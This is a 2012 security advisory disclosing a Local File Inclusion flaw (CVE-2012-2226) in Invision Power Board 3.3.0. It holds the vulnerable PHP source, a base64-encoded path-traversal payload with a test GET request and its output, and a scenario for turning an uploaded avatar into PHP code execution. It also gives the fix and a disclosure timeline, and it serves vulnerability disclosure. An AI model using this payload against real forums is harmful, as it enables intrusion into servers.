@@ -1,0 +1,198 @@
+[waraxe-2012-SA#086] - Local File Inclusion in Invision Power Board 3.3.0
+========================================================================
+=======
+
+Author: Janek Vind "waraxe"
+Date: 12. April 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-86.html
+CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2226
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~
+
+Invision Power Board (abbreviated IPB, IP.Board or IP Board) is an Internet
+forum software produced by Invision Power Services, Inc.
+It is written in PHP and primarily uses MySQL as a database management system,
+although support for other database engines is available.
+
+Vulnerable versions
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~
+
+Affected are Invision Power Board versions 3.3.0 and 3.2.3, older versions
+may be vulnerable as well.
+
+########################################################################
+#######
+1. Local File Inclusion in "like.php" function "_unsubscribe"
+########################################################################
+#######
+
+CVE Information:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~
+The Common Vulnerabilities and Exposures (CVE) project has assigned the
+name CVE-2012-2226 to this issue. This is a candidate for inclusion in
+the CVE list (http://cve.mitre.org/), which standardizes names for
+security problems.
+
+Vulnerability Details:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~
+Reason: using unsanitized user submitted data for file operations
+Attack vector: user submitted GET parameter "key"
+Preconditions:
+1. attacker must be logged in as valid user
+2. PHP must be < 5.3.4 for null-byte attacks to work
+Result: remote file disclosure, php remote code execution
+
+Source code snippet from vulnerable script "like.php":
+-----------------[ source code start ]---------------------------------
+protected function _unsubscribe()
+{
+/* Fetch data */
+$key = trim( IPSText::base64_decode_urlSafe( $this->request['key'] ) );
+
+list( $app, $area, $relId, $likeMemberId, $memberId, $email ) = explode( ';', $key );
+
+/* Member? */
+if ( ! $this->memberData['member_id'] )
+{
+$this->registry->output->showError( 'no_permission', 'pcgl-1' );
+}
+
+if ( ! $app || ! $area || ! $relId )
+{
+$this->registry->output->showError( 'no_permission', 'pcgl-1' );
+}
+
+if ( ( $memberId != $likeMemberId ) || ( $memberId != $this->memberData['member_id'] ) )
+{
+$this->registry->output->showError( 'no_permission', 'pcgl-2' );
+}
+
+if ( $email != $this->memberData['email'] )
+{
+$this->registry->output->showError( 'no_permission', 'pcgl-3' );
+}
+
+/* Think we're safe... */
+$this->_like = classes_like::bootstrap( $app, $area );
+-----------------[ source code end ]-----------------------------------
+
+As seen above, user submitted parameter "key" is first base64 decoded and then
+splitted to six variables. After multiple checks function "bootstrap()" is called,
+using unvalidated user submitted data for arguments.
+
+Source code snippet from vulnerable script "composite.php":
+-----------------[ source code start ]---------------------------------
+static public function bootstrap( $app=null, $area=null )
+{
+..
+if( $area != 'default' )
+{
+$_file = IPSLib::getAppDir( $app ) . '/extensions/like/' . $area . '.php';
+..
+}
+..
+if ( ! is_file( $_file ) )
+{
+..
+throw new Exception( "No like class available for $app - $area" );
+..
+}
+..
+$classToLoad = IPSLib::loadLibrary( $_file, $_class, $app );
+-----------------[ source code end ]-----------------------------------
+
+We can see, that variable "$_file" is composed using unvalidated argument "area".
+Next there is check for file existence and in case of success next function,
+"loadLibrary", is called, using unvalidated argument "$_file".
+
+Source code snippet from vulnerable script "core.php":
+-----------------[ source code start ]---------------------------------
+static public function loadLibrary( $filePath, $className, $app='core' )
+{
+/* Get the class */
+if ( $filePath != '' )
+{
+require_once( $filePath );/*noLibHook*/
+}
+-----------------[ source code end ]-----------------------------------
+
+As seen above, "require_once" function is used with unvalidated argument.
+
+Test: we need to construct specific base64 encoded payload.
+First, semicolon-separated string:
+
+forums;/../../test;1;1;1;come2waraxe (at) yahoo (dot) com [email concealed]
+
+Email address and other components must be valid for successful test.
+
+After base64 encoding:
+
+Zm9ydW1zOy8uLi8uLi90ZXN0OzE7MTsxO2NvbWUyd2FyYXhlQHlhaG9vLmNvbQ
+
+Now let's log in as valid user and then issue GET request:
+
+http://localhost/ipb330/index.php?app=core&module=global&section=like
+&do=unsubscribe&key=Zm9ydW1zOy8uLi8uLi90ZXN0OzE7MTsxO2NvbWUyd2FyYXhlQHlh
+aG9vLmNvbQ
+
+Result:
+
+Fatal error: Uncaught exception 'Exception' with message 'No like class available
+for forums - /../../test' in C:\apache_www\ipb330\admin\sources\classes\like\composite.php:333
+Stack trace: #0 C:\apache_www\ipb330\admin\applications\core\modules_public\global\like.
+php(131):
+classes_like::bootstrap('forums', '/../../test')
+#1 C:\apache_www\ipb330\admin\applications\core\modules_public\global\like.
+php(44):
+public_core_global_like->_unsubscribe()
+#2 C:\apache_www\ipb330\admin\sources\base\ipsController.php(306):
+public_core_global_like->doExecute(Object(ipsRegistry)) #3
+C:\apache_www\ipb330\admin\sources\base\ipsController.php(120): ipsCommand->execute(Object(ipsRegistry))
+#4 C:\apache_www\ipb330\admin\sources\base\ipsController.php(65): ipsController->handleRequest()
+#5 C:\apache_www\ipb330\index.php(26): ipsController::run()
+#6 {main} thrown in C:\apache_www\ipb330\admin\sources\classes\like\composite.php on line 333
+
+Potential attack scenario:
+
+1. Attacker registers to target forum and logs in as valid user
+2. Attacker uploads avatar picture with malicious php code to target server
+3. Attacker issues carefully crafted GET or POST request and as result gets php level access
+
+There are many other ways to exploit LFI (Local File Inclusion) vulnerabilities,
+for example by using procfs ("proc/self/environ") on *nix platforms.
+
+How to fix:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~
+
+Update to new version 3.3.1
+
+http://community.invisionpower.com/topic/360518-ipboard-331-ipblog-252-i
+pseo-152-and-updates-for-ipboard-32x-ipgallery-42x-released/
+
+Disclosure Timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~
+
+27.03.2012 Developers contacted via email
+28.03.2012 Developers confirmed upcoming patch
+11.04.2012 Developers announced new version release
+12.04.2012 Advisory released
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~
+
+come2waraxe (at) yahoo (dot) com [email concealed]
+Janek Vind "waraxe"
+
+Waraxe forum: http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
